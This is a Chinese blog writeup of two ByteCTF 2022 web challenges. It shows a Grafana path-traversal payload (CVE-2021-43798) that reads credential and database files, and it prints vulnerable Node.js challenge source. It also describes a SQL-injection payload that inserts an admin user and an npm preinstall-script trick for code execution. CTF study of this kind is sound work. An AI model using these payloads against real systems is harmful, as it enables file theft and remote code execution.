---
title: "2022 ByteCTF Web 部分 Writeup"
date: 2022-09-29T20:17:22+08:00
lastmod: 2022-09-29T20:17:22+08:00
draft: false
author: "X1r0z"

tags: ['ctf','nodejs']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

军训没啥时间, 只能赛后自己试着做了一下...

感觉挺难的, 就做出来两道题

<!--more-->

## easy_grafana

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209262037154.png)

Grafana v8.2.6, 存在 CVE-2021-43798 任意文件读取

[https://github.com/j-jasson/CVE-2021-43798-grafana_fileread](https://github.com/j-jasson/CVE-2021-43798-grafana_fileread)

直接用 payload 不行, 好像是 nginx 反向代理的问题?

改成如下的形式就能够读取文件了

```
/public/plugins/annolist/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209262039369.png)

配置文件路径

```
/etc/grafana/grafana.ini
```

里面的 `admin_password` 是注释掉的, 然后数据库的信息也没有

不过有个 secret_key

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209262042945.png)

先放着 (后面才知道有用)

了解了一下发现 grafana 默认的数据库是 sqlite3, 数据库路径如下

```
/var/lib/grafana/grafana.db
```

读取之

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209262042037.png)

本地用 sqlite3 打开后发现 password 是加盐的, 格式是 `md5(md5(password) + salt)`, 估计是无法爆破了

然后在网上找相关的 writeup 时发现了这篇文章

[https://blog.csdn.net/weixin_45794666/article/details/123228409](https://blog.csdn.net/weixin_45794666/article/details/123228409)

利用工具

[https://github.com/A-D-Team/grafanaExp](https://github.com/A-D-Team/grafanaExp)

拿着 secret_key 去解密 db 文件, 意外的拿到了 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209262045605.png)

## ctf_cloud

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282043435.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282043765.png)

nodejs 的题

之前并没有学过 nodejs, 只能硬着头皮看... 好在没有涉及到 js 的相关特性

首先吐槽一下源码里的 src/public/app/public/ 目录, 感觉跟套娃一样, 容易乱...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282024178.png)

下面就贴出来关键的文件

routes/dashboard.js

```js
var express = require('express');
var router = express.Router();
var multer  = require('multer');
var path = require('path');
var fs = require('fs');
var cp = require('child_process');
var dependenciesCheck = require('../utils/dashboard');
var upload = multer({dest: '/tmp/'});

var appPath = path.join(__dirname, '../public/app');
var appBackupPath = path.join(__dirname, '../public/app_backup');

/* authentication middleware */
router.use(function(req, res, next) {
    if (!req.session.is_login)
      return res.json({"code" : -1 , "message" : "Please login first."});
   next();
});

/* upload api */
router.post('/upload', upload.any(),function(req, res, next) {
    if (!req.files) {
        return res.json({"code" : -1 , "message" : "Please upload a file."});
    }
    var file = req.files[0];

    // check file name
    if (file.originalname.indexOf('..') !== -1 || file.originalname.indexOf('/') !== -1) {
        return res.json({"code" : -1 , "message" : "File name is not valid."});
    }

    // do upload
    var filePath = path.join(appPath, '/public/uploads/', file.originalname);
    var fileContent = fs.readFileSync(file.path);
    fs.writeFile(filePath, fileContent, function(err) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error writing file."});
        } else {
            res.json({"code" : 0 , "message" : "Upload successful at " + filePath});
        }
    })
});

/* list upload dir */
router.get('/list', function(req, res, next) {
    var files = fs.readdirSync(path.join(appPath, '/public/uploads/'));
    res.json({"code" : 0 , "message" : files});
})

/* reset user app */
router.post('/reset', function(req, res, next) {
    // reset app folder
    cp.exec('rm -rf ' + appPath + '/*', function(err, stdout, stderr) {
       if (err) {
           console.log(err);
           return res.json({"code" : -1 , "message" : "Error resetting app."});
       } else {
           cp.exec('cp -r ' + appBackupPath + '/* ' + appPath + '/', function(err, stdout, stderr) {
               if (err) {
                   console.log(err);
                   return res.json({"code" : -1 , "message" : "Error resetting app."});
               } else {
                   return res.json({"code" : 0 , "message" : "Reset successful"});
               }
           });
       }
    });
})

/* dependencies get router */
router.get('/dependencies', function(req, res, next) {
   res.json({"code" : 0 , "message" : "Please post me your dependencies."});
});

/* set node.js dependencies */
router.post('/dependencies', function(req, res, next) {
    var dependencies = req.body.dependencies;

    // check dependencies
    if (typeof dependencies != 'object' || dependencies === {})
        return res.json({"code" : -1 , "message" : "Please input dependencies."});
    if (!dependenciesCheck(dependencies))
        return res.json({"code" : -1 , "message" : "Dependencies are not valid."});

    // write dependencies to package.json
    var filePath = path.join(appPath, '/package.json');
    var packageJson = {
        "name": "userapp",
        "version": "0.0.1",
        "dependencies": {
        }
    };
    packageJson.dependencies = dependencies;
    var fileContent = JSON.stringify(packageJson);
    fs.writeFile(filePath, fileContent, function(err) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error writing file."});
        } else {
            return res.json({"code" : 0 , "message" : "Set successful"});
        }
    });
});


/* run npm install */
router.post('/run', function(req, res, next) {
    if (!req.session.is_admin)
        return res.json({"code" : -1 , "message" : "Please login as admin."});
    cp.exec('cd ' + appPath + ' && npm i --registry=https://registry.npm.taobao.org', function(err, stdout, stderr) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error running npm install."});
        }
        return res.json({"code" : 0 , "message" : "Run npm install successful"});
    });
});

/* force kill npm install */
router.post('/kill', function(req, res, next) {
    if (!req.session.is_admin)
        return res.json({"code" : -1 , "message" : "Please login as admin."});
    // kill npm process
    cp.exec("ps -ef | grep npm | grep -v grep | awk '{print $2}' | xargs kll -9", function(err, stdout, stderr) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error killing npm install."});
        }
        return res.json({"code" : 0 , "message" : "Kill npm install successful"});
    });
}
);


module.exports = router;
````

routes/users.js

```js
var express = require('express');
var router = express.Router();
var sqlite3 = require('sqlite3').verbose();
var stringRandom = require('string-random');
var db = new sqlite3.Database('db/users.db');
var passwordCheck = require('../utils/user');

/* login */
router.post('/signin', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    if (!passwordCheck(password))
        return res.json({"code" : -1 , "message" : "Password is not valid."});

    db.get("SELECT * FROM users WHERE NAME = ? AND PASSWORD = ?", [username, password], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (!row) {
            return res.json({"code" : -1 , "msg" : "Username or password is incorrect"});
        }
        req.session.is_login = 1;
        if (row.NAME === "admin" && row.PASSWORD == password && row.ACTIVE == 1) {
            req.session.is_admin = 1;
        }
        return res.json({"code" : 0, "message" : "Login successful"});
    });

});

/* register */
router.post('/signup', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    // check if username exists
    db.get("SELECT * FROM users WHERE NAME = ?", [username], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (row) {
            console.log(row)
            return res.json({"code" : -1 , "message" : "Username already exists"});
        } else {
            // in case of sql injection , I'll reset admin's password to a new random string every time.
            var randomPassword = stringRandom(100);
            db.run(`UPDATE users SET PASSWORD = '${randomPassword}' WHERE NAME = 'admin'`, ()=>{});

            // insert new user
            var sql = `INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES (?, '${password}', 0)`;
            db.run(sql, [username], function(err) {
                if (err) {
                    console.log(err);
                    return res.json({"code" : -1, "message" : "Error executing SQL query " + sql});
                }
                return res.json({"code" : 0, "message" : "Sign up successful"});
            });
        }
    });
});

/* logout */
router.get('/logout', function(req, res) {
    req.session.is_login = 0;
    req.session.is_admin = 0;
    res.redirect('/');
});

module.exports = router;
````

utils/dashboard.js

```js
var dependenciesCheck = function (dependencies) {
    var blacklist = ['__proto__', 'prototype', 'constructor'];
    for ( let denpendency in dependencies) {
        for (var i = 0; i < blacklist.length; i++) {
            if (denpendency.indexOf(blacklist[i]) !== -1 || dependencies[denpendency].indexOf(blacklist[i]) !== -1) {
                return false;
            }
        }
    }
    return true;
}

module.exports = dependenciesCheck;
````

utils/user.js

```js
var passwordCheck = function (password) {
    var blacklist = ['>', '<', '=', '"', ";", '^', '|', '&', ' ', 'and', 'or', 'case', 'if', 'substr', 'like', 'glob', 'regexp', 'mid', 'trim', 'right', 'left', 'between', 'in', 'print', 'format', 'password', 'users', 'from', 'random' ];
    for (var i = 0; i < blacklist.length; i++) {
        if (password.indexOf(blacklist[i]) !== -1) {
            return false;
        }
    }
    return true;
}

module.exports = passwordCheck;
````

utils 中的 dependenciesCheck passwordCheck 阻止了原型链污染和注入

不过后面发现这个 passwordCheck 函数并没有什么用

dashboard.js 大致分为这几个功能: 文件上传, 配置依赖, 执行 `npm i`

其中配置依赖时配置的是 package.json 中的 dependencies 项

网上了解了一下 package.json 发现有一个 scripts 项可以执行 shell 命令

[https://www.ruanyifeng.com/blog/2016/10/npm_scripts.html](https://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)

[http://leungwensen.github.io/blog/2016/running-scripts-with-npm.html](http://leungwensen.github.io/blog/2016/running-scripts-with-npm.html)

例子如下

```json
{
  "name": "death-clock",
  "version": "1.0.0",
  "scripts": {
    "start": "node server.js",
    "test": "mocha --reporter spec test"
  },
  "devDependencies": {
    "mocha": "^1.17.1"
  }
}
```

其中 scripts 可以自定义对应生命周期执行的命令

这里我们用 preinstall (其实 install 和 postinstall 也行)

构造如下

```json
"scripts": {
    "preinstall": "whoami",
},
```

本地测试后发现 scripts 只能配置在第一层级

而题目源码中对 package.json 的配置如下

```js
var packageJson = {
    "name": "userapp",
    "version": "0.0.1",
    "dependencies": {
    }
};
packageJson.dependencies = dependencies;
```

即如果我们这样写, scripts 中的命令是无法执行的

```json
{
    "name": "userapp",
    "version": "0.0.1",
    "dependencies": {
        "scripts": {
            "preinstall": "whoami",
            },
    }
}
```

思路一下子断了...

之后又搜了一下 package.json 依赖的配置详解, 发现除了默认从 nodejs 核心库或者 npm 仓库中获取对应模块以外, 还能够指定路径获取本地的模块

```json
{
    "name": "userapp",
    "version": "0.0.1",
    "dependencies": {
        "test": "file:/foo/bar",
    }
}
```

package.json 就是对模块的声明, 在每一个被依赖模块路径下的 package.json 中我们依然可以指定 scripts 项

恰好 dashboard 中有文件上传的功能, 那么我们就可以在 uploads 下上传我们自定义的 package.json, 然后配置依赖的时候指定到这个 uploads 目录, 最后执行 `npm i` 就能够 getshell 了

随便注册一个用户, 然后上传文件

这里的 html 表单有点问题, 需要自己构造

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282042012.png)

后面测试的时候发现机器不能出网, 无法反弹 shell, 只能将 flag 输出再 uploads 目录下

源码中对 public 目录做了 static 映射, 所以能够直接访问到, 就是路径有点奇怪 (/app/public/uploads/flag.txt)

再设置依赖

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282042120.png)

点击编译的时候发现需要以管理员身份登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282044778.png)

dashboard.js 中的部分代码

```js
router.post('/run', function(req, res, next) {
    if (!req.session.is_admin)
        return res.json({"code" : -1 , "message" : "Please login as admin."});
    cp.exec('cd ' + appPath + ' && npm i --registry=https://registry.npm.taobao.org', function(err, stdout, stderr) {
        if (err) {
            return res.json({"code" : -1 , "message" : "Error running npm install."});
        }
        return res.json({"code" : 0 , "message" : "Run npm install successful"});
    });
});
````

只有当 `req.session.is_admin` 为 true (也就是 1) 时才能够执行 `npm i`

user.js 中的部分代码

```js
db.get("SELECT * FROM users WHERE NAME = ? AND PASSWORD = ?", [username, password], function(err, row) {
    if (err) {
        console.log(err);
        return res.json({"code" : -1, "message" : "Error executing SQL query"});
    }
    if (!row) {
        return res.json({"code" : -1 , "msg" : "Username or password is incorrect"});
    }
    req.session.is_login = 1;
    if (row.NAME === "admin" && row.PASSWORD == password && row.ACTIVE == 1) {
        req.session.is_admin = 1;
    }
    return res.json({"code" : 0, "message" : "Login successful"});
});
```

当 `row.NAME === "admin" && row.PASSWORD == password && row.ACTIVE == 1` 三个条件同时满足时才会设置 `req.session.is_admin = 1`

user.js 中大部分 sql 语句都是以预编译的方式执行的, 但仔细找找还是能发现漏网之鱼

```js
var sql = `INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES (?, '${password}', 0)`;
db.run(sql, [username], function(err) {
    if (err) {
        console.log(err);
        return res.json({"code" : -1, "message" : "Error executing SQL query " + sql});
    }
    return res.json({"code" : 0, "message" : "Sign up successful"});
});
```

注册时传入了 password, 而 sql 中的 `${password}` 其实也是对字符串直接进行了拼接, 可以任意构造 sql 语句

数据库是 sqlite, 当 password 传入 `test',1) --` 时尽管可以满足 `row.ACTIVE == 1`, 但是 `row.NAME === "admin"` 依然不满足

盯着 sql 语句看的时候突然想起来 insert 语句中的 values 关键词是不是可以插入多条数据?

```sql
INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES ('test', 'test', 0), ('admin', 'admin', 1);
```

本地测试执行成功, 于是构造 payload 如下

```
test',0),('admin','admin',1)--
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282054273.png)

然后用 admin/admin 登录时提示 `Password is not valid.`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282055312.png)

看了一下 utils/user.js 发现原来是密码 `admin` 中的 `in` 包含在了 blacklist 里面...

改成 123456 就能够登录了

点击编译, 然后等一会

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282057227.png)

访问 /app/public/uploads/flag.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209282057810.png)